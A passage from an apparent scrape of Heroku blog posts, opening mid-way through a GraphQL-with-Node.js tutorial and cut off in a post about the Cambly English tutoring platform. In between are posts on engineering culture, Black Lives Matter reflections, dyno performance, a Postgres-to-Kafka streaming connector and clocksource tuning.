define this too: type Query {\n  user(id: Int!): User\n}\n\ntype User { ... }\ntype Address { ... } Arguments on a field are a comma-separated list, which takes the form of $NAME: $TYPE . The ! is GraphQL's way of denoting that the argument is required—omitting means it's optional. Depending on your language of choice, the process of incorporating this schema into your server varies, but in general, consuming this information as a string is enough. Node.js has the graphql package to prepare a GraphQL schema, but we're going to use the graphql-tools package instead, because it provides a few more niceties. Let's import the package and read our type definitions in preparation for future development: const fs = require('fs')\nconst { makeExecutableSchema } = require(\"graphql-tools\");\n\nlet typeDefs = fs.readFileSync(\"schema.graphql\", {\n  encoding: \"utf8\",\n  flag: \"r\",\n}); Setting up resolvers A schema sets up the ways in which queries can be constructed but establishing a schema to define your data model is just one part of the GraphQL specification. The other portion deals with actually fetching the data. This is done through the use of resolvers . A resolver is a function that returns a field's underlying value. Let's take a look at how you might implement resolvers in Node.js. The intent is to solidify concepts around how resolvers operate in conjunction with schemas, so we won't go into too much detail around how the data stores are set up. In the \"real world\", we might establish a database connection with something like knex . For now, let's just set up some dummy data: const users = {\n  1: {\n    name: \"Luke\",\n    email: \"luke@heroku.space\",\n    addresses: [\n    {\n          street: \"1234 Rodeo Drive\",\n          city: \"Los Angeles\",\n          country: \"USA\",\n    },\n    ],\n  },\n  2: {\n    name: \"Jane\",\n    email: \"jane@heroku.space\",\n    addresses: [\n    {\n          street: \"1234 Lincoln Place\",\n          city: \"Brooklyn\",\n          country: \"USA\",\n    },\n    ],\n  },\n}; GraphQL resolvers in Node.js amount to an Object with the key as the name of the field to be retrieved, and the value being a function that returns the data. Let's start with a barebones example of the initial user lookup by id: const resolvers = {\n  Query: {\n    user: function (parent, { id }) {\n      // user lookup logic\n    },\n  },\n} This resolver takes two arguments: an object representing the parent (which in the initial root query is often unused), and a JSON object containing the arguments passed to your field. Not every field will have arguments, but in this case, we will, because we need to retrieve our user by their ID. The rest of the function is straightforward: const resolvers = {\n  Query: {\n    user: function (_, { id }) {\n      return users[id];\n    },\n  }\n} You'll notice that we didn't explicitly define a resolver for User or Addresses . The graphql-tools package is intelligent enough to automatically map these for us. We can override these if we choose, but with our type definitions and resolvers now defined, we can build our complete schema: const schema = makeExecutableSchema({ typeDefs, resolvers }); Running the server Finally, let's get this demo running! Since we're using Express, we can use the express-graphql package to expose our schema as an endpoint. The package requires two arguments: your schema, and your root value. It takes one optional argument, graphiql , which we'll talk about in a bit. Set up your Express server on your favorite port with the GraphQL middleware like this: const express = require(\"express\");\nconst express_graphql = require(\"express-graphql\");\n\nconst app = express();\napp.use(\n  \"/graphql\",\n  express_graphql({\n    schema: schema,\n    graphiql: true,\n  })\n);\napp.listen(5000, () => console.log(\"Express is now live at localhost:5000\")); Navigate your browser to http://localhost:5000/graphql , and you should see a sort of IDE interface. On the left pane, you can enter any valid GraphQL query you like, and on your right you'll get the results. This is what graphiql: true provides: a convenient way of testing out your queries. You probably wouldn't want to expose this in a production environment, but it makes testing much easier. Try entering the query we demonstrated above: query {\n  user(id: 1) {\n    name\n    email\n  }\n} To explore GraphQL's typing capabilities, try passing in a string instead of an integer for the ID argument: # this doesn't work\nquery {\n  user(id: \"1\") {\n    name\n    email\n  }\n} You can even try requesting fields that don't exist: # this doesn't work\nquery {\n  user(id: 1) {\n    name\n    zodiac\n  }\n} With just a few clear lines of code expressed by the schema, a strongly-typed contract between the client and server is established. This protects your services from receiving bogus data and expresses errors clearly to the requester. Performance considerations For as much as GraphQL takes care of for you, it doesn't solve every problem inherent in building APIs. In particular, caching and authorization are just two areas that require some forethought to prevent performance issues. The GraphQL spec does not provide any guidance for implementing either of these, which means that the responsibility for building them falls onto you. Caching REST-based APIs don't need to be overly concerned when it comes to caching, because they can build on existing HTTP header strategies that the rest of the web uses. GraphQL doesn't come with these caching mechanisms, which can place undue processing burden on your servers for repeated requests. Consider the following two queries: query {\n  user(id: 1) {\n    name\n  }\n}\n\nquery {\n  user(id: 1) {\n    email\n  }\n} Without some sort of caching in place, this would result in two database queries to fetch the User with an ID of 1 , just to retrieve two different columns. In fact, since GraphQL also allows for aliases , the following query is valid and also performs two lookups: query {\n  one: user(id: 1) {\n    name\n  }\n  two: user(id: 2) {\n    name\n  }\n} This second example exposes the problem of how to batch queries. In order to be fast and efficient, we want GraphQL to access the same database rows with as few roundtrips as possible. The dataloader package was designed to handle both of these issues. Given an array of IDs, we will fetch all of those at once from the database; as well, subsequent calls to the same ID will fetch the item from the cache. To build this out using dataloader , we need two things. First, we need a function to load all of the requested objects. In our sample, that looks something like this: const DataLoader = require('dataloader');\nconst batchGetUserById = async (ids) => {\n   // in real life, this would be a DB call\n  return ids.map(id => users[id]);\n};\n// userLoader is now our \"batch loading function\"\nconst userLoader = new DataLoader(batchGetUserById); This takes care of the issue with batching. To load the data, and work with the cache, we'll replace our previous data lookup with a call to the load method and pass in our user ID: const resolvers = {\n  Query: {\n    user: function (_, { id }) {\n      return userLoader.load(id);\n    },\n  },\n} Authorization Authorization is an entirely different problem with GraphQL. In a nutshell, it's the process of identifying whether a given user has permission to see some data. We can imagine scenarios where an authenticated user can execute queries to get their own address information, but they should not be able to get the addresses of other users. To handle this, we need to modify our resolver functions. In addition to a field's arguments, a resolver also has access to its parent, as well as a special context value passed in, which can provide information about the currently authenticated user. Since we know that addresses is a sensitive field, we need to change our code such that a call to users doesn't just return a list of addresses, but actually, calls out to some business logic to validate the request: const getAddresses = function(currUser, user) {\n  if (currUser.id == user.id) {\n    return user.addresses\n  }\n\n  return [];\n}\n\nconst resolvers = {\n  Query: {\n    user: function (_, { id }) {\n      return users[id];\n    },\n  },\n  User: {\n    addresses: function (parentObj, {}, context) {\n          return getAddresses(context.currUser, parentObj);\n    },\n  },\n}; Again, we don't need to explicitly define a resolver for each User field—only the one which we want to modify. By default, express-graphql passes the current HTTP request as a value for context , but this can be changed when setting up your server: app.use(\n  \"/graphql\",\n  express_graphql({\n    schema: schema,\n    graphiql: true,\n    context: {\n      currUser: user // currently authenticated user\n    }\n  })\n); Schema best practices One aspect missing from the GraphQL spec is the lack of guidance on versioning schemas. As applications grow and change over time, so too will their APIs, and it's likely that GraphQL fields and objects will need to be removed or modified. But this downside can also be positive: by designing your GraphQL schema carefully, you can avoid pitfalls apparent in easier to implement (and easier to break) REST endpoints, such as inconsistencies in naming and confusing relationships. Marc-Andre has listed several strategies for building evolvable schemas which we highly recommend reading through. In addition, you should try to keep as much of your business logic separate from your resolver logic . Your business logic should be a single source of truth for your entire application. It can be tempting to perform validation checks within a resolver, but as your schema grows, it will become an untenable strategy. When is GraphQL not a good fit? GraphQL doesn't mold precisely to the needs of HTTP communication the same way that REST does. For example, GraphQL specifies only a single status code— 200 OK —regardless of the query’s success. A special errors key is returned in this response for clients to parse and identify what went wrong. Because of this, error handling can be a bit trickier. As well, GraphQL is just a specification, and it won't automatically solve every problem your application faces. Performance issues won't disappear, database queries won't become faster, and in general, you'll need to rethink everything about your API: authorization, logging, monitoring, caching. Versioning your GraphQL API can also be a challenge, as the official spec currently has no support for handling breaking changes, an inevitable part of building any software. If you're interested in exploring GraphQL, you will need to dedicate some time to learning how to best integrate it with your needs. Learning more The community has rallied around this new paradigm and come up with a list of awesome GraphQL resources , for both frontend and backend engineers. You can also see what queries and types look like by making real requests on the official playground . We also have a Code[ish] podcast episode dedicated entirely to the benefits and costs of GraphQL. api javascript graphql", "date": "2020-06-24,"},
{"website": "Heroku", "title": "Electric’s Advice During Uncertain Times: Invest in Your Culture ", "author": ["Neil Fredrickson"], "link": "https://blog.heroku.com/invest-in-your-culture", "abstract": "Electric’s Advice During Uncertain Times: Invest in Your Culture Posted by Neil Fredrickson June 23, 2020 Listen to this article Some say that the only constant in life is change. That may be true, but often what’s more important than the change itself is how we react. We all go through life trying to manage change (albeit with varying degrees of success), so we can better cope with it, learn from it, and adapt. Like individuals, organizations can learn the same “life skill,” so that change is not only less disruptive, but it also becomes a measure of organizational health that can lead to success. Sometimes, it takes a pandemic Times of sudden change, like during the COVID-19 crisis, are especially tough on everyone. Most companies are scrambling to figure out their “new normal;” employees and teams are struggling to adjust to a dramatically different day-to-day. Despite a myriad of challenges, the business still depends on everyone staying productive, collaborative, and efficient while working remotely. How can weathering sudden, radical change be less painful for all? There’s a lot of helpful advice these days around how to set up and optimize a fully remote workplace. These tactical steps are important, but they don’t always address the intangible needs of an organization. Culture — the shared mindset, practices, and experiences that define a group of people — can either add friction or fuel positive outcomes in the face of change. For Electric , a remote IT solution provider, it all starts with developing a culture that thrives on change. I find their model and methods both impressive and inspiring. Electric makes agility a top priority I recently met up with Yotam Hadass, VP of Engineering at Electric, to hear more about his perspective on remote work and operational agility. Electric provides online IT solutions for small to medium-sized businesses with anywhere from a dozen to several hundred employees. Their 100% remote service integrates with customers’ Slack or Microsoft Teams and provides real-time helpdesk support for a wide range of IT issues, including hardware, software, network, and security. Since the pandemic hit, Electric has seen a new wave of customers who are under pressure to move their IT operations online and need extra guidance and support to navigate such unfamiliar territory. These conversations are a natural part of Electric’s close customer relationships, which stem from the company’s commitment to feedback and dialog — key components of its culture. A holistic approach to engineering ops Feedback and dialog also play an important role in keeping the engineering organization energized and continuously improving. Electric’s concept of operational agility is based on lean development — the classic build/measure/learn loop that drives product development. The same thinking can be applied to operations. An operation only works well if you continue to learn from it and iterate on it. This is where Electric’s culture shines. At Electric, an operation is defined as a combination of specific processes, the value that they bring to the organization, and the team experience of implementing them (as well as tooling, technology, and similar considerations). An operation is a team’s best practice of doing a thing at a particular moment. How they do it or why they do it may change in the future, but the current best practice represents the team’s shared knowledge and agreement as it stands today. In the engineering arena, an operation may focus on agile development, roadmap planning, tech debt elimination, developer experience, continuous delivery — basically any topic that impacts a team’s ability to deliver upon their goals. Finding the balance between structure and freedom Typically, organizations approach operations in one of two polar opposite ways. Either team practices and workflows are mandated from senior management; everyone must adhere to the same, prescribed path. This can cause a sense of frustration in some individuals, and it can impose a rigidity that doesn’t serve all teams or needs well. Or conversely, nothing is mandated and every team does whatever works for them, which creates inconsistency between teams and can hinder collaboration. In most cases, operations get set up, become fixed, and rarely change. Electric aims for the middle ground. They’ve established a collaborative process that empowers special best practice teams, called “councils” who function as caretakers of their particular operation. Run by volunteers who are passionate about the topic, these councils meet regularly to gather feedback, discuss ideas, define, and iterate on best practices for that operation. They make sure that input comes from the entire organization and not just one or two people’s opinions or experiences. The result: org-wide alignment that still leaves room for autonomy and innovation. Yotam Hadass says “Our overall goal is to operate as best as we know how as a team, learn from each other, and continue to improve the process on all fronts.” At Electric, every major operation remains a living, evolving dimension of the organization that can adjust easily as things change. This collective focus on continuous improvement feeds back into the company’s culture. Yotam goes into more depth on this in the Code[ish] podcast: Defining Operational Agility . There’s gold in customer feedback and dialog Learning doesn’t just happen within teams. Electric has built a robust feedback loop with customers that enables them to grow their service and business. Beginning with customer onboarding, a dedicated implementation team follows a structured process that works closely with customers from initial needs assessment to training. Much of this happens as a series of conversations about what IT means to a particular customer’s organization and how Electric can support their unique configurations and workflows. Once up and running, customer success teams check in with customers regularly to help solve problems or gather new learnings. The service itself is also a source of feedback as real-time conversations happen with employees in a helpdesk chat channel. Sometimes, this customer dialog surfaces new insights that can influence the product roadmap. Says Yotam, “Customer feedback has really shaped our product. We learn so much from our customers. Instead of just having a rigid idea of how things should work and forcing it on customers, we are able to use our learnings to make better product decisions.” Recently, Electric has taken inspiration from their internal best practice teams and created the Electric Insider Council. This group is made up of a cross-section of customers that come together to have a discussion with the Electric team about what works, what doesn’t, areas of improvement, and more. Any and all feedback is encouraged, and the Electric team allows the customers’ voices to shape how they think about their product. Investing in culture builds resiliency Call it agility, flexibility, or just plain openness — Electric embraces change as a driving force behind what makes everyone successful, be it the engineers and teams or the business and its customers. Investing in a culture of continuous improvement builds resiliency. So when the unexpected happens, like a global pandemic, there are processes and a shared mindset in place to adjust as an organization without skipping a beat. From this perspective, Yotam can even see a silver lining during these times of enforced work from home. He says, “When everyone is remote, the playing field is level. Everyone has an equal chance to participate and be heard, rather than some being left out of in-office conversations.” This sense of equality and inclusivity further enhances a culture that’s already deeply rooted in dialog. Some of these ideas may feel obvious, but they are so easy to forget in a fast-paced organization. Electric has really made their culture of continuous improvement and innovation a reality. We can learn a lot from them during these uncertain times and beyond. . collaboration culture", "date": "2020-06-23,"},
{"website": "Heroku", "title": "Black Lives Matter: Our Thoughts, Actions, and Resources", "author": ["Jennifer Hooper", "Sally Vedros", "Raul Murciano", "Charlie Gleason", "Kimberly Lowe-Williams", "David Routen", "Caleb Hearth", "Christie Fidura"], "link": "https://blog.heroku.com/black-lives-matter", "abstract": "Black Lives Matter: Our Thoughts, Actions, and Resources Posted by Jennifer Hooper , Sally Vedros , Raul Murciano , Charlie Gleason , Kimberly Lowe-Williams , David Routen , Caleb Hearth and Christie Fidura June 29, 2020 Listen to this article It is never easy to know how to react, communicate, or at times, even feel, during something as heartbreaking and real as the struggles that our fellow humans face through no fault of their own. As Herokai, we stand in solidarity with the Black Lives Matter movement and want to share some of our thoughts on the struggle, as well as some actions and resources that we find helpful. We will be keeping this post updated and would love to include your voice. Please send us any thoughts that you’d like to share at: feedback@heroku.com . “Many, if not all, of us are watching the civil rights movement taking place around the world. We are hurting, we are angry, and many of us are asking, “How can I support? What can I do?” We all have an opportunity to take a hard look at ourselves and to educate ourselves of the reality that has existed for over 400 years for Black people in the United States. If we’re interested in becoming allies, we need to do the work first. An intersectional group of Diversity Equity and Inclusion practitioners created this course because they wanted to alleviate the burden Black communities face fielding questions from allies on what they can do. To be true allies, we need to be anti-racist, and to do so we need to develop a deep understanding of systematic racism and white supremacy. This intersectional group has seen many non-Black people struggling to know where to start, so they hope this 20-day, bite-sized text message course can provide everyone with some knowledge on the history of racism, the oppressive systems that continue to exist today, and how to show up. I’ve just signed up for the course, which is geared toward non-Black people to educate ourselves on how we can: Understand systematic racism and anti-blackness, white supremacy, and racial economics; and recognize that race is in every aspect of America. Check our own privilege and show up for the Black community every day. Keep educating ourselves. These are short, bite-sized pieces of information with resources to get you started, as well as links to Black leaders and voices. Each of the topics will require further reading and exploration on your own. The course is called Practicing Anti-Racism 101 . It costs $6, all of which is donated to nonprofit organizations doing important work in the area. We can all do something and we should start with educating ourselves. We can all do better and I think it will begin with understanding the role non-Black people like myself have played in the marginalization of Black people.” — Caleb Hearth, Heroku Tier 3 Data Support “I'm keenly aware of my privilege as a white man in tech. I regret not being able to be out protesting, however, I am checking on my Black peers (and former peers) and asking them what I can do to help. It's so important to recognize that there are many different ways that we can support the movement in this time of change.” — Evan Light, Sr Manager, Heroku Web Services “I decided it was time to speak up... I created What CAN YOU do? — a list for corporations and individuals that goes beyond that which is less controllable into impactful and empowering alliance. I hope this is meaningful and mobilizes change in some way.” — Kimberly Lowe-Williams, Sr. Manager, Heroku and Nonprofit Leader “For me personally, I’m trying to learn as much as I can. Currently reading Why I’m No Longer Talking To White People About Race .” — Charlie Gleason, User Interface / User Experience Lead, Heroku “A small thing, but we’ve been listening to this on loop: https://twitter.com/GeeDee215/status/1268930514976636930 because provenance is important on the internet: This is the original video Which was remixed by @alexengelberg on TikTok I am definitively not your tourguide for the wider TikTok community, but from what I can see, https://www.tiktok.com/@rynnstar ’s content is stellar. If you want a Black content creator to follow, kindly follow her.” — Tom Reznick, Engineer, Heroku Data “It’s hard to put all my thoughts and feelings into words and I expect I will fail here. My heart is heavy and I am doing my best to support and continue to learn during this period. I am drawing huge inspiration from others who are reacting with such thoughtfulness, grace, and humility. People coming together in beautiful ways gives me hope.” — Jennifer Hooper, Sr. Director, Technical Product Marketing, Content, and Brand “With the murder of George Floyd, I took the opportunity to stay quiet. I listened and tried to learn; I absorbed and tried to think. I believe that with education comes empathy and understanding, and so I’ve tried to modify my social feeds so that I can continuously learn. By following groups championing diversity, equality, and social justice, I hope to gain understanding which feeds into direct action. I intrinsically understand that behaviour must change, and I must first change my own behaviour to ensure I can help others. Thanks to Salesforce’s employee resource group BOLDforce for this strong list of organisations to follow, I am on a path to discovery. The more I know, the more effective I can be. Organizations I am following on social media: Antiracism Center: Twitter Audre Lorde Project: Twitter | Instagram | Facebook Black Women’s Blueprint: Twitter | Instagram | Facebook Color Of Change: Twitter | Instagram | Facebook Colorlines: Twitter | Instagram | Facebook The Conscious Kid: Twitter | Instagram | Facebook Equal Justice Initiative (EJI): Twitter | Instagram | Facebook Families Belong Together: Twitter | Instagram | Facebook Justice League NYC: Twitter | Instagram + Gathering For Justice: Twitter | Instagram The Leadership Conference on Civil & Human Rights: Twitter | Instagram | Facebook The Movement For Black Lives (M4BL): Twitter | Instagram | Facebook MPowerChange: Twitter | Instagram | Facebook Muslim Girl: Twitter | Instagram | Facebook NAACP: Twitter | Instagram | Facebook National Domestic Workers Alliance: Twitter | Instagram | Facebook RAICES: Twitter | Instagram | Facebook Showing Up for Racial Justice (SURJ): Twitter | Instagram | Facebook SisterSong: Twitter | Instagram | Facebook United We Dream: Twitter | Instagram | Facebook ” — Christie Fidura, Director, EMEA Developer Marketing, Salesforce “I have always been quiet to speak out about different causes on social media because I was afraid to say the wrong thing or offend someone. I have realized that I am hurting people by staying quiet and have decided to use my voice and my white privilege to help. I have been learning, listening, and using my voice to have difficult conversations with friends, family, acquaintances, and I will no longer stay quiet. I know there's more work to be done so that every single human is treated equally, that is why I say Black Lives Matter. I encourage people to do their own research and find different ways that they can support the movement for equality for Black lives. Right now, I have been donating money to a few different organizations. If you would like to join me, below is just a short list of where you can send your support. I Fund Women Campaign Zero Your local bail fund to support protesters, and so many more. An additional inspiration is seeing the things that others at our company are doing, such as the Outforce group on Black Life Matters . I used to listen, silent, when abuse happened out of my reach. Ashamed of a race and gender that abuse their privilege. Unable to contribute with anything not obvious, politically correct. As if what others may think about me mattered more than what was at stake :( I’m thankful that someone took the time to educate me and others by sharing a link to “ Nothing to add: A challenge to white silence in cross-racial discussions ,” an article that refuted any reasons I could come up with to remain silent.” — Raul Murciano, Software Engineering Manager, Heroku / Salesforce “After reflecting on the most recent murders of Black American citizens by police officers and by white \"vigilantes,\" I honestly don't know what to say. I am angry, I am heartbroken, and I am exhausted. And I've only been reflecting on this for a few weeks. I cannot imagine what it must be like to go through life having to constantly carry this terrible burden. I am sorry it's taken me so long to finally acknowledge and accept that we have so many serious problems with systematic racism and racial inequality in our country, and that we must start repairing that damage now. ( How to Be an Antiracist by Ibram X. Kendi has helped me considerably already by providing context, ideas on how to be part of the solution, and hope.) I promise I will do better this time by educating myself further, donating to charities that support racial equality and pride, and by doing what I can to help make my community a more just and better place.” — David Routen, Software Engineer, Heroku / Salesforce “I am struggling to articulate my immense horror and heartache of the recent murders and the centuries of systemic brutality and oppression of African Americans. How can I ‘be the change I want to see in the world?’ I can commit to trying harder to live every day with conscious empathy and awareness. I can actively look for ways that I can learn and contribute to helping this country become a place of safety and equality. I can also help to keep the conversation going so that this moment — finally, finally, finally — becomes a catalyst that brings true, lasting social justice.” — Sally Vedros, Marketing Writer, Heroku / Salesforce See how Salesforce is taking action for racial equality and justice From the community \" The Basics of Black Lives Matter – and Why You Need to Act Today \" by journalist Bernard Meyer humans blm quality", "date": "2020-06-29,"},
{"website": "Heroku", "title": "Container and Runtime Performance Improvements", "author": ["Michael Friis"], "link": "https://blog.heroku.com/runtime-performance-improvements", "abstract": "Container and Runtime Performance Improvements Posted by Michael Friis July 16, 2020 Listen to this article Today we’re sharing three performance enhancements that we have recently rolled out to apps running in Private Spaces: Dynos upgraded to the latest generation infrastructure for 10-15% perf improvement More consistent performance for Small Private and Shield Space dynos Optimized clock source selection Heroku is a fully managed platform-as-a-service (PaaS) and we work tirelessly to continuously improve and enhance the experience of running apps on our platform. Unlike lower-level infrastructure-as-a-service systems, improvements are applied automatically to apps and databases and require no action or intervention from app developers to benefit. That means that no action is required on your part to take advantage of the improved performance: Your app dynos have been switched out for upgraded and optimized ones by Heroku’s automated orchestration systems with no planning, maintenance or downtime for you or your apps. New Infrastructure Generation We have gradually upgraded the dyno-compute and networking that powers your apps to the latest generation available from our infrastructure provider. On average, CPU-bound apps should see at least a 10-15% performance improvement although details will vary with workload. Networking and other I/O is also greatly improved. Consistent Performance for Small Private Space Dynos The infrastructure powering private-s and shield-s dynos in Private and Shield Private Spaces has been upgraded to have more consistent performance. To give customers the best balance of cost and performance these dyno types previously ran on burstable infrastructure that throttled under heavy load. This behavior was not intuitive and we’re happy to report that now even small dynos in Private Spaces run all-out 100% of the time. Clocksource Now tsc and kvm-clock “What time is it?” is something a computer program asks the operating system surprisingly often. Time and date is required to timestamp log lines, trace code performance or to fill in the CREATED_AT column for a database record. And for the operating system, VM and hardware it’s actually not that simple to provide an exact answer quickly. Most systems have several components (“clocksources”) that the operating system can use to help keep track of time and they come with different tradeoffs in terms of accuracy and performance. Based on user-feedback and after careful testing and validation Heroku recently optimized clocksource selection on our infrastructure to use tsc and kvm-clock. Some customers that made heavy use of the system clock for request performance timing saw latency reductions of up to 50% after the change was introduced (apps that make less aggressive use of the system clock should not expect similar gains). Read Will Farrington’s post on the Engineering Blog for details on how we identified and implemented the clocksource enhancement for details. Summary The three performance improvements detailed in this blog post are great examples of the benefits of relying on a managed PaaS like Heroku rather than running apps directly on un-managed infrastructure that has to be laboriously maintained and updated. Because we operate at vast scale we can invest in validating infrastructure upgrades and in systems and processes that perform those upgrades seamlessly and with no downtime to the millions of apps running on Heroku. Heroku Enterprise Private Spaces performance", "date": "2020-07-16,"},
{"website": "Heroku", "title": "Introducing the Streaming Data Connectors Beta: Capture Heroku Postgres Changes in Apache Kafka on Heroku", "author": ["Scott Truitt"], "link": "https://blog.heroku.com/streaming-data-connectors-beta", "abstract": "Introducing the Streaming Data Connectors Beta: Capture Heroku Postgres Changes in Apache Kafka on Heroku Posted by Scott Truitt July 09, 2020 Listen to this article Today we are announcing a beta release of our new streaming data connector between Heroku Postgres and Apache Kafka on Heroku. Heroku runs millions of Postgres services and tens of thousands of Apache Kafka services, and we increasingly see developers choosing to start with Apache Kafka as the foundation of their data architecture. But for those who are Postgres-first, it is challenging to adopt without a full app rewrite. Developers want a seamless integration between the two services, and we are delivering it today, at no additional charge, for Heroku Private Spaces and Shield Spaces customers. Moving beyond Postgres and Kafka, the Heroku Data team sees the use cases for data growing more complex and diverse, and we know they can no longer be solved by one database technology alone. As new data services emerge and existing offerings become more sophisticated, the days of a single monolithic datastore are over. Apache Kafka is a key enabling technology for these emerging data architectures. We spent the last year focused on embracing this new reality outside of our four walls. We shipped new features that allow Heroku Managed Data Services to integrate with external resources in Amazon VPCs over Private Link and resources in other public clouds or private data centers over mutual TLS. But we had a problem inside that we wanted to solve too. Effortless Change Data Capture (CDC) by Heroku CDC isn’t a new idea. It involves monitoring one or more Postgres tables for writes, updates, and deletes, and then writing each change to an Apache Kafka topic. Sounds simple enough, but the underlying complexity is significant. We took the time to experiment with the open-source technologies that made it possible and were thrilled to find a path forward that provides a stable service at scale. We use Kafka Connect and Debezium to take data at rest and put it in motion. Like Heroku Postgres and Apache Kafka on Heroku, the connector is fully-managed, has a simple and powerful user experience, and comes with our operational excellence built-in every aspect of the service. It’s as Easy as heroku data:connectors:create To get started, make sure you have Heroku Postgres and Apache Kafka on Heroku add-ons in a Private or Shield Space, as well as the CLI plugin . Then create a connector by identifying the Postgres source and Apache Kafka store by name, specifying which table(s) to include, and optionally blocking which columns to exclude: heroku data:connectors:create \\\n    --source postgresql-neato-98765 \\\n    --store kafka-lovely-12345 \\\n    --table public.posts --table public.users \\\n    --exclude public.users.password See the full instructions and best practices for more detail. Once provisioned, which takes about 15 minutes, the connector automatically streams changes from Heroku Postgres to Apache Kafka on Heroku. From there, you can refactor your monolith into microservices, implement an event-based architecture, integrate with other downstream data services, build a data lake, archive data in lower-cost storage services, and so much more. Feedback Welcome We are thrilled to share our latest work with you and eager to get your feedback. Please send any questions, comments, or feature requests our way. integration streaming data data Heroku Postgres apache kafka kafka postgres", "date": "2020-07-09,"},
{"website": "Heroku", "title": "Making Time to Save You Time: How We Sped Up Time-Related Syscalls on Dynos", "author": ["Will Farrington"], "link": "https://blog.heroku.com/clocksource-tuning", "abstract": "Making Time to Save You Time: How We Sped Up Time-Related Syscalls on Dynos Posted by Will Farrington July 16, 2020 Listen to this article I work on Heroku’s Runtime Infrastructure team, which focuses on most of the underlying compute and containerization here at Heroku. Over the years, we’ve tuned our infrastructure in a number of ways to improve performance of customer dynos and harden security. We recently received a support ticket from a customer inquiring about poor performance in two system calls (more commonly referred to as syscalls) their application was making frequently: clock_gettime(3) and gettimeofday(2) . In this customer’s case, they were using a tool to do transaction tracing to monitor the performance of their application. This tool made many such system calls to measure how long different parts of their application took to execute. Unfortunately, these two system calls were very slow for them. Every request was impacted waiting for the time to return, slowing down the app for their users. To help diagnose the problem we first examined our existing clocksource configuration. The clocksource determines how the Linux kernel gets the current time. The kernel attempts to choose the \"best\" clocksource from the sources available. In our case, the kernel was defaulting to the xen clocksource, which seems reasonable at a glance since the EC2 infrastructure that powers Heroku’s Common Runtime and Private Spaces products uses the Xen hypervisor under the hood. Unfortunately, the version of Xen in use does not support a particular optimization—virtual dynamic shared object (or \" vDSO \")—for the two system calls in question. In short, vDSO allows certain operations to be performed entirely in userspace rather than having to context switch into kernelspace by mapping some kernel functionality into the current process. Context switching between userspace and kernelspace is a somewhat expensive operation—it takes a lot of CPU time. Most applications won’t see a large impact from occasional context switches, but when context switches are happening hundreds or thousands of times per web request, they can add up very quickly! Thankfully, there are often several available clocksources to choose from. The available clocksources depends on a combination of the CPU, the Linux kernel version, and the hardware virtualization software being used. Our research revealed tsc seemed to be the most promising clocksource and would support vDSO. tsc utilizes the Time Stamp Counter to determine the System Time. During our research, we also encountered a few other blog posts about TSC. Every source we referenced agreed that non-vDSO accelerated system calls were significantly slower, but there was some disagreement on how safe use of TSC would be. The Wikipedia article linked in the previous paragraph also lists some of these safety concerns. The two primary concerns centered around backwards clock drift that could occur due to: (1) TSC inconsistency that plagued older processors in hyper-threaded or multi-CPU configurations, and (2) when freezing/unfreezing Xen virtual machines. To the first concern, Heroku uses newer Intel CPUs for all dynos that have significantly safer TSC implementations. To the second concern, EC2 instances, which Heroku dynos use, do not utilize freezing/unfreezing today. We decided that tsc would be the best clocksource choice to support vDSO for these system calls without introducing negative side effects. We were able to confirm using the tsc clocksource enabled vDSO acceleration with the excellent vdsotest tool (although you can verify your own results using strace ). After our internal testing, we deployed the tsc clocksource configuration change to the Heroku Common Runtime and Private Spaces dyno fleet. While the customer who filed the initial support ticket that led to this change noticed the improvement, the biggest surprise for us was when other customers started inquiring about unexpected performance improvements (which we knew to be a result of this change). It’s always nice for us when our work to solve a problem for a specific customer has a significant positive impact for all customers. We're glad to be able to make changes like this that benefit all Heroku users. Detailed diagnostic and tuning work like this may not be worth the time investment for an individual engineering team managing their own infrastructure outside of Heroku. Heroku’s scale allows us to identify unique optimization opportunities and invest time into validating and implementing tweaks like this that make apps on Heroku run faster and more reliably. virtualization tuning performance syscall clocksource", "date": "2020-07-16,"},
{"website": "Heroku", "title": "How a Live Tutoring Platform Helps the Working World Get Ahead", "author": ["Sally Vedros"], "link": "https://blog.heroku.com/live-tutoring-platform", "abstract": "How a Live Tutoring Platform Helps the Working World Get Ahead Posted by Sally Vedros July 21, 2020 Listen to this article In today's global economy, English proficiency unlocks opportunity. People all over the world are motivated to improve their English skills in order to make a better life for themselves and their families. Cambly is a language education platform that helps millions of learners advance their careers by connecting them with English-speaking tutors from a similar professional background. For many language learners, speaking is often the hardest skill to improve in a classroom setting. Conversation time is limited, and students tend to practice with each other rather than with a teacher. Some students may not have a fluent speaker available in their location. Cambly offers one-on-one tutoring sessions over live video chat, 24/7. Students anywhere in the world can practice speaking with a tutor at any time during their busy day, whether it’s for 15 minutes on their lunch break or late at night when the kids are asleep. Cambly’s “Hello, World” moment Two important developments in mobile hardware paved the way for Cambly’s founders, Kevin Law and Sameer Shariff, to bring their vision to life. Smartphones started coming out with front-facing cameras, and broadband internet connections became widespread across devices and markets. For the first time, most people had hardware that could support live video chat without having to strap a USB camera to their laptop. The founders took full advantage of these features and developed an MVP for iOS. That first app was super simple. When a user pressed a button to initiate a tutoring session, Kevin’s phone would ring and he’d run to a computer to join the video chat. Cambly has since evolved from there, of course, but these early experiences proved that the founders had a market. In the beginning, Kevin was the only tutor available, and his very first chat took him, and his caller, by complete surprise. An App Store reviewer was just testing the app and had hit the call button to see what would happen. When Kevin suddenly appeared in the app and said “Hi,” the reviewer panicked and hung up! As the calls started rolling in, many people like the Apple Reviewer were shocked to have a live person appear in the app just moments after downloading it. Kevin says, “I had some pretty funny conversations in those days. But on-demand service has always been an important part of Cambly, especially for that first-time user experience.” The working world speaks on Cambly Over time, Kevin met hundreds of people from around the world. Many people had never spoken with a native English speaker, even though they had been taking English classes throughout their lives. Many were professionals who excelled at their jobs, but needed to improve their English speaking skills in order to advance their careers. English fluency would help learners communicate better in the workplace, ace a job interview at an international company, or attract more English-speaking clients. “It proved our hypothesis,” says Kevin. “I’m not a professional English teacher; I’m a software engineer. I thought that there may be a lot of people who have studied English for a long time that would be interested in talking to me.” Not only do tutors teach language skills, but they also help learners understand the culture and context of their industry in a different country. For example, a registered nurse may want to understand patient etiquette in the U.K., or a tour operator may want to know more about Australian cultural norms. As Kevin points out, “I’ll speak with software engineers who want to know what engineering teams in the U.S. care most about. They want to learn insider lingo, as well as how to pronounce technology brands and terms like a native speaker.” The global diversity of tutors on Cambly is also a major bonus. Many learners want to practice speaking with tutors with different regional accents to enhance their listening and pronunciation skills. The (not so) secret language of pilots Kevin and Sameer soon discovered that it’s not just software engineers who want to practice their English with other engineers. Learners from a wide range of industries flock to Cambly to speak with tutors from the same background. The platform predominantly attracts sales and business professionals, as well as people from healthcare, government, tourism, and many other sectors. All want to practice their speaking skills with the opportunity to learn industry-specific vocabulary and 